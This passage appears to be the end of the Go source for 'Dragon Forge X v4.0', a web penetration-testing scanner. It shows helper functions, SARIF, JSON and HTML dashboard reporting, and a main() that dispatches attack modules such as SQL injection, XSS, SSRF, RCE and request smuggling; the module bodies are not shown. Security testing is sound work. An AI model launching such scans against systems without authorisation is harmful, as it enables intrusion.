func trunc(s string, n int) string {
	if len(s) > n {
		return s[:n]
	}
	return s
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func containsAny(s string, ms []string) bool {
	sl := strings.ToLower(s)
	for _, m := range ms {
		if strings.Contains(sl, strings.ToLower(m)) {
			return true
		}
	}
	return false
}

// resolveRef resolves a possibly-relative reference (including query/fragment)
// against a base URL. Returns "" when the reference cannot be parsed.
func resolveRef(base *url.URL, ref string) string {
	if base == nil {
		return ref
	}
	ru, err := url.Parse(strings.TrimSpace(ref))
	if err != nil {
		return ""
	}
	return base.ResolveReference(ru).String()
}

func urljoin(b, u string) string {
	if strings.HasPrefix(u, "http") {
		return u
	}
	pu, err := url.Parse(b)
	if err != nil {
		return u
	}
	return resolveRef(pu, u)
}

func escHTML(s string) string {
	return html.EscapeString(s)
}

// ============================================================================
// REPORT
// ============================================================================

func (c *Ctx) saveSARIF() {
	p := filepath.Join(c.ResultDir, "report.sarif")
	type SarifMessage struct {
		Text string `json:"text"`
	}
	type SarifLocation struct {
		PhysicalLocation struct {
			ArtifactLocation struct {
				URI string `json:"uri"`
			} `json:"artifactLocation"`
		} `json:"physicalLocation"`
	}
	type SarifResult struct {
		RuleID    string          `json:"ruleId"`
		Level     string          `json:"level"`
		Message   SarifMessage    `json:"message"`
		Locations []SarifLocation `json:"locations,omitempty"`
	}
	type SarifRun struct {
		Tool struct {
			Driver struct {
				Name           string `json:"name"`
				Version        string `json:"version"`
				InformationURI string `json:"informationUri"`
			} `json:"driver"`
		} `json:"tool"`
		Results []SarifResult `json:"results"`
	}
	type SarifDoc struct {
		Schema  string     `json:"$schema"`
		Version string     `json:"version"`
		Runs    []SarifRun `json:"runs"`
	}

	doc := SarifDoc{
		Schema:  "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
		Version: "2.1.0",
		Runs: []SarifRun{{
			Tool: struct {
				Driver struct {
					Name           string `json:"name"`
					Version        string `json:"version"`
					InformationURI string `json:"informationUri"`
				} `json:"driver"`
			}{
				Driver: struct {
					Name           string `json:"name"`
					Version        string `json:"version"`
					InformationURI string `json:"informationUri"`
				}{
					Name:           "Dragon Forge X",
					Version:        "4.0",
					InformationURI: "https://github.com/dragon-forge-x",
				},
			},
			Results: []SarifResult{},
		}},
	}

	for _, f := range c.Findings {
		level := "note"
		switch f.Severity {
		case "CRITICAL", "HIGH":
			level = "error"
		case "MEDIUM":
			level = "warning"
		case "LOW", "INFO":
			level = "note"
		}
		res := SarifResult{
			RuleID:  f.Module + "/" + f.ID,
			Level:   level,
			Message: SarifMessage{Text: fmt.Sprintf("[%s] %s: %s", f.Severity, f.Title, f.Evidence)},
		}
		loc := SarifLocation{}
		loc.PhysicalLocation.ArtifactLocation.URI = c.Target
		res.Locations = []SarifLocation{loc}
		doc.Runs[0].Results = append(doc.Runs[0].Results, res)
	}

	c.saveJSON(p, doc)
	fmt.Printf("[+] SARIF: %s\n", p)
}

func report(c *Ctx) {
	c.phase("REPORT")
	counts := map[string]int{}
	for _, f := range c.Findings {
		counts[f.Severity]++
	}

	// Colored CLI Summary Table
	totalDuration := time.Since(c.startTime).Seconds()
	fmt.Println("\n┌─────────────────────────────────────────────────────────┐")
	fmt.Printf("│  \x1b[1m\x1b[32mDRAGON FORGE X v4.0 — SCAN SUMMARY\x1b[0m                     │\n")
	fmt.Printf("│  Target: %-46s │\n", trunc(c.Target, 46))
	fmt.Printf("│  Duration: %-44s │\n", fmt.Sprintf("%.1fs", totalDuration))
	fmt.Printf("│  Total Findings: %-38d │\n", len(c.Findings))
	fmt.Println("├─────────────────────────────────────────────────────────┤")
	for _, s := range []string{"CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"} {
		color := SevColors[s]
		fmt.Printf("│  %s%-10s\x1b[0m %-44d │\n", color, s, counts[s])
	}
	if len(c.Technologies) > 0 {
		fmt.Println("├─────────────────────────────────────────────────────────┤")
		fmt.Printf("│  Tech: %-48s │\n", trunc(strings.Join(c.Technologies, ", "), 48))
	}
	if len(c.Forms) > 0 {
		fmt.Printf("│  Discovered Forms: %-36d │\n", len(c.Forms))
	}
	if len(c.APIEndpoints) > 0 {
		fmt.Printf("│  API Endpoints: %-39d │\n", len(c.APIEndpoints))
	}
	if len(c.Subdomains) > 0 {
		fmt.Printf("│  Subdomains: %-42d │\n", len(c.Subdomains))
	}
	fmt.Println("└─────────────────────────────────────────────────────────┘")

	sort.Slice(c.Findings, func(i, j int) bool {
		return SevOrder[c.Findings[i].Severity] < SevOrder[c.Findings[j].Severity]
	})

	// JSON Export
	c.saveJSON(filepath.Join(c.ResultDir, "report.json"), map[string]interface{}{
		"target":       c.Target,
		"duration":     totalDuration,
		"findings":     c.Findings,
		"technologies": c.Technologies,
		"forms_count":  len(c.Forms),
		"endpoints":    len(c.APIEndpoints),
		"subdomains":   len(c.Subdomains),
		"ts":           c.now(),
	})

	// SARIF Export
	c.saveSARIF()

	// Modern Interactive HTML Dashboard (Offline, Self-contained)
	var cards []string
	for _, f := range c.Findings {
		sevClass := strings.ToLower(f.Severity)
		pocHTML := ""
		if f.PoC != "" {
			pocHTML = fmt.Sprintf(`<div class="poc-box"><span class="label">PoC:</span> <code>%s</code></div>`, escHTML(f.PoC))
		}
		evidenceHTML := ""
		if f.Evidence != "" {
			evidenceHTML = fmt.Sprintf(`<pre class="evidence">%s</pre>`, escHTML(f.Evidence))
		}
		cards = append(cards, fmt.Sprintf(`
		<div class="card sev-%s" data-sev="%s" data-mod="%s">
			<div class="card-header">
				<span class="badge badge-%s">%s</span>
				<span class="mod-tag">%s</span>
				<span class="fid">%s</span>
				<h3 class="title">%s</h3>
			</div>
			<div class="card-body">
				%s
				%s
			</div>
		</div>`,
			sevClass, sevClass, strings.ToLower(f.Module),
			sevClass, escHTML(f.Severity), escHTML(f.Module), escHTML(f.ID), escHTML(f.Title),
			evidenceHTML, pocHTML))
	}

	var techPills []string
	for _, t := range c.Technologies {
		techPills = append(techPills, fmt.Sprintf(`<span class="pill">%s</span>`, escHTML(t)))
	}

	htmlContent := fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Dragon Forge X — %s</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: #0b0f14; color: #c9d1d9; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace; line-height: 1.5; padding: 24px; }
  .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 20px; border-bottom: 1px solid #21262d; margin-bottom: 24px; }
  .header h1 { font-size: 26px; color: #58a6ff; font-weight: 700; }
  .header .meta { color: #8b949e; font-size: 14px; text-align: right; }
  .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 14px; margin-bottom: 24px; }
  .stat-card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 14px; text-align: center; }
  .stat-card .num { font-size: 28px; font-weight: 700; margin-top: 4px; }
  .stat-card.critical .num { color: #ff4d4f; }
  .stat-card.high .num { color: #fa8c16; }
  .stat-card.medium .num { color: #faad14; }
  .stat-card.low .num { color: #1890ff; }
  .stat-card.info .num { color: #8b949e; }
  .stat-card.total .num { color: #52c41a; }
  .controls { display: flex; gap: 12px; margin-bottom: 20px; flex-wrap: wrap; align-items: center; }
  .search-input { flex: 1; min-width: 240px; background: #161b22; border: 1px solid #30363d; color: #c9d1d9; padding: 10px 14px; border-radius: 6px; font-size: 14px; outline: none; }
  .search-input:focus { border-color: #58a6ff; }
  .filter-btn { background: #21262d; border: 1px solid #30363d; color: #c9d1d9; padding: 8px 14px; border-radius: 6px; cursor: pointer; font-size: 13px; font-weight: 600; }
  .filter-btn.active { background: #1f6feb; color: #fff; border-color: #388bfd; }
  .pills-container { margin-bottom: 20px; display: flex; gap: 8px; flex-wrap: wrap; }
  .pill { background: #1f242c; border: 1px solid #38414e; color: #79c0ff; padding: 4px 10px; border-radius: 20px; font-size: 12px; }
  .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; margin-bottom: 14px; overflow: hidden; transition: border-color 0.2s; }
  .card:hover { border-color: #58a6ff; }
  .card-header { padding: 12px 16px; background: #1c2128; display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
  .badge { padding: 3px 8px; border-radius: 4px; font-size: 11px; font-weight: 700; text-transform: uppercase; color: #fff; }
  .badge-critical { background: #a61d24; }
  .badge-high { background: #d9381e; }
  .badge-medium { background: #d29922; color: #111; }
  .badge-low { background: #1f6feb; }
  .badge-info { background: #30363d; }
  .mod-tag { background: #232a35; color: #8b949e; padding: 2px 7px; border-radius: 4px; font-size: 12px; }
  .fid { color: #484f58; font-size: 12px; }
  .title { font-size: 15px; color: #e6edf3; flex: 1; min-width: 200px; }
  .card-body { padding: 14px 16px; }
  .evidence { background: #0d1117; border: 1px solid #21262d; border-radius: 6px; padding: 10px 12px; font-family: monospace; font-size: 13px; color: #e6edf3; overflow-x: auto; white-space: pre-wrap; word-break: break-word; margin-bottom: 8px; }
  .poc-box { background: #1c2430; border: 1px solid #29405b; border-radius: 6px; padding: 8px 12px; font-size: 13px; color: #58a6ff; }
  .poc-box .label { color: #8b949e; font-weight: 600; margin-right: 6px; }
</style>
</head>
<body>
<div class="header">
  <div>
    <h1>DRAGON FORGE X v4.0</h1>
    <p style="color:#8b949e; margin-top:4px;">Automated Penetration Testing & Recon Dashboard</p>
  </div>
  <div class="meta">
    <div><strong>Target:</strong> %s</div>
    <div><strong>Scan Time:</strong> %s (%.1fs)</div>
  </div>
</div>

<div class="stats-grid">
  <div class="stat-card total"><div>TOTAL</div><div class="num">%d</div></div>
  <div class="stat-card critical"><div>CRITICAL</div><div class="num">%d</div></div>
  <div class="stat-card high"><div>HIGH</div><div class="num">%d</div></div>
  <div class="stat-card medium"><div>MEDIUM</div><div class="num">%d</div></div>
  <div class="stat-card low"><div>LOW</div><div class="num">%d</div></div>
  <div class="stat-card info"><div>INFO</div><div class="num">%d</div></div>
</div>

%s

<div class="controls">
  <input type="text" class="search-input" id="search" placeholder="Search by title, module, evidence, or ID...">
  <button class="filter-btn active" onclick="setFilter('all')">ALL (%d)</button>
  <button class="filter-btn" onclick="setFilter('critical')">CRITICAL (%d)</button>
  <button class="filter-btn" onclick="setFilter('high')">HIGH (%d)</button>
  <button class="filter-btn" onclick="setFilter('medium')">MEDIUM (%d)</button>
  <button class="filter-btn" onclick="setFilter('low')">LOW (%d)</button>
  <button class="filter-btn" onclick="setFilter('info')">INFO (%d)</button>
</div>

<div id="findings-list">
%s
</div>

<script>
let currentFilter = 'all';
function setFilter(sev) {
  currentFilter = sev;
  document.querySelectorAll('.filter-btn').forEach(b => {
    b.classList.toggle('active', b.innerText.toLowerCase().startsWith(sev));
  });
  applyFilter();
}
document.getElementById('search').addEventListener('input', applyFilter);
function applyFilter() {
  const q = document.getElementById('search').value.toLowerCase();
  document.querySelectorAll('#findings-list .card').forEach(card => {
    const s = card.getAttribute('data-sev');
    const txt = card.innerText.toLowerCase();
    const matchesSev = (currentFilter === 'all' || s === currentFilter);
    const matchesText = !q || txt.includes(q);
    card.style.display = (matchesSev && matchesText) ? 'block' : 'none';
  });
}
</script>
</body>
</html>`,
		escHTML(c.Target),
		escHTML(c.Target), c.now(), totalDuration,
		len(c.Findings), counts["CRITICAL"], counts["HIGH"], counts["MEDIUM"], counts["LOW"], counts["INFO"],
		func() string {
			if len(techPills) > 0 {
				return `<div class="pills-container"><strong style="align-self:center;font-size:13px;color:#8b949e;">Tech:</strong> ` + strings.Join(techPills, "") + `</div>`
			}
			return ""
		}(),
		len(c.Findings), counts["CRITICAL"], counts["HIGH"], counts["MEDIUM"], counts["LOW"], counts["INFO"],
		strings.Join(cards, "\n"))

	c.saveTxt(filepath.Join(c.ResultDir, "report.html"), htmlContent)
	fmt.Printf("[+] HTML Dashboard: %s/report.html\n", c.ResultDir)
	fmt.Printf("[+] JSON Report:    %s/report.json\n", c.ResultDir)
}

// ============================================================================
// MAIN
// ============================================================================

func main() {
	a := Args{}
	flag.StringVar(&a.URL, "u", "", "Target URL (required)")
	flag.BoolVar(&a.All, "all", false, "Run all modules")
	flag.StringVar(&a.Modules, "modules", "waf,recon,scan", "Modules")
	flag.BoolVar(&a.Active, "active", false, "Active scanning")
	flag.BoolVar(&a.External, "external", false, "Run external tools")
	flag.StringVar(&a.Out, "out", ".", "Output dir")
	flag.StringVar(&a.ResultDir, "result-dir", "result", "Result subdir")
	flag.IntVar(&a.MaxPages, "max-pages", 20, "Max crawl pages")
	flag.IntVar(&a.Timeout, "timeout", 15, "Timeout (s)")
	flag.BoolVar(&a.Insecure, "insecure", false, "Skip TLS")
	flag.StringVar(&a.Username, "username", "", "Username")
	flag.StringVar(&a.Password, "password", "", "Password")
	flag.IntVar(&a.Threads, "threads", 10, "Workers")
	flag.Float64Var(&a.Delay, "delay", 0.5, "Delay (s)")
	flag.BoolVar(&a.RotateUA, "rotate-ua", false, "Rotate UA")
	flag.StringVar(&a.Diff, "diff", "", "Previous scan dir for diff")
	flag.Var(&a.Headers, "H", "Custom header (repeatable, e.g. -H 'Authorization: Bearer ...')")
	flag.Parse()
	if a.URL == "" {
		fmt.Println("Error: -u required")
		os.Exit(1)
	}

	c := NewCtx(a)
	// Graceful shutdown on SIGINT / Ctrl+C
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt)
	go func() {
		<-sigChan
		fmt.Println("\n\x1b[33m[!] Interrupt received (Ctrl+C). Halting modules gracefully and finalizing reports...\x1b[0m")
		c.cancel()
	}()

	// Normalize URL
	nu := a.URL
	if !strings.HasPrefix(nu, "http") {
		nu = "https://" + nu
	}
	p, err := url.Parse(nu)
	if err != nil || p.Host == "" {
		fmt.Println("Invalid URL")
		os.Exit(1)
	}
	c.Target = nu
	c.Host = strings.Split(p.Host, ":")[0]
	c.Base = fmt.Sprintf("%s://%s", p.Scheme, p.Host)
	c.TargetScheme = p.Scheme
	c.TargetAuthority = p.Host
	c.TargetPort = effectivePort(p)
	c.ScopePath = p.EscapedPath()
	if c.ScopePath == "" {
		c.ScopePath = "/"
	}
	c.Scope = []string{c.baseDomain(c.Host)}
	c.setupClient()
	c.initDirs()

	fmt.Print(Banner)
	fmt.Printf("Target: %s\nThreads: %d\nDelay: %.1fs\n", c.Target, a.Threads, a.Delay)
	if len(c.CustomHeaders) > 0 {
		fmt.Printf("Custom Headers: %d configured\n", len(c.CustomHeaders))
	}
	c.writeJSONL(filepath.Join(c.LogDir, "events.jsonl"),
		map[string]interface{}{"event": "start", "target": c.Target, "ts": c.now()})

	mods := c.selectedMods()

	runners := map[string]func(*Ctx){
		"waf": runWAF, "recon": runRecon, "portscan": runPortScan, "scan": runScan, "app": runApp,
		"js": runJS, "dom": runDOM, "param": runParam, "secret": runSecret,
		"file": runFile, "cors": runCORS, "header": runHeader, "rate": runRate,
		"sqli": runSQLI, "idor": runIDOR, "xss": runXSS, "csrf": runCSRF,
		"cache": runCache, "ssrf": runSSRF,
		"graphql": runGraphQL, "bola": runBOLA, "wordlist": runWordlist,
		"cloud": runCloud, "mass": runMass, "proto": runProto,
		"smuggling": runSmuggling, "subtakeover": runSubTakeover,
		"subdomain": runSubdomain, "openapi": runOpenAPI, "jwt": runJWT,
		"csp": runCSP, "wasm": runWASM, "oauth": runOAuth, "deser": runDeser,
		"ssti": runSSTI, "rce": runRCE, "xxe": runXXE,
		"dedup": runDedup, "diff": runDiff, "external": runExternal,
	}

	for _, m := range mods {
		if c.cancelled() {
			fmt.Println("\n\x1b[33m[!] Scan halted by user.\x1b[0m")
			break
		}
		if r, ok := runners[m]; ok {
			st := time.Now()
			func() {
				defer func() {
					if e := recover(); e != nil {
						fmt.Printf("[!] %s error: %v\n", m, e)
					}
				}()
				r(c)
			}()
			c.Timings[m] = time.Since(st).Seconds()
		}
	}

	report(c)
	c.saveFull()
	fmt.Printf("\n[+] Module Timings:\n")
	for m, t := range c.Timings {
		fmt.Printf("  %-12s %.1fs\n", m, t)
	}
}
